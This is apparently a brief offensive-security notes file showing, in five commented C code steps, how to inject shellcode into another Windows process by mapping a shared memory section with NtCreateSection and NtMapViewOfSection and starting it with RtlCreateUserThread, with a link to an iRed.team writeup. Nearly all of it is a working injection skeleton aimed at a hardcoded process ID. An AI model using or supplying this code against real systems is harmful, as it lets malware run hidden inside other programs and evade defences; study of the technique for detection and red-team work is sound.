[Why duplicate work? iRed.team has a great writeup](https://www.ired.team/offensive-security/code-injection-process-injection/ntcreatesection-+-ntmapviewofsection-code-injection)
<br><br><br>

STEP #1 create a memory section
	fNtCreateSection(&sectionHandle, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, (PLARGE_INTEGER)&sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
	
STEP #2	create a view of the memory section in the local process
	fNtMapViewOfSection(sectionHandle, GetCurrentProcess(), &localSectionAddress, NULL, NULL, NULL, &size, 2, NULL, PAGE_READWRITE);

STEP #3 create a view of the memory section in the target process
	HANDLE targetHandle = OpenProcess(PROCESS_ALL_ACCESS, false, 1480);
	fNtMapViewOfSection(sectionHandle, targetHandle, &remoteSectionAddress, NULL, NULL, NULL, &size, 2, NULL, PAGE_EXECUTE_READ);

STEP #4 copy shellcode to the local view, which will get reflected in the target process's mapped view
	memcpy(localSectionAddress, buf, sizeof(buf));
	
STEP #5 HANDLE targetThreadHandle = NULL;
	fRtlCreateUserThread(targetHandle, NULL, FALSE, 0, 0, 0, remoteSectionAddress, NULL, &targetThreadHandle, NULL);
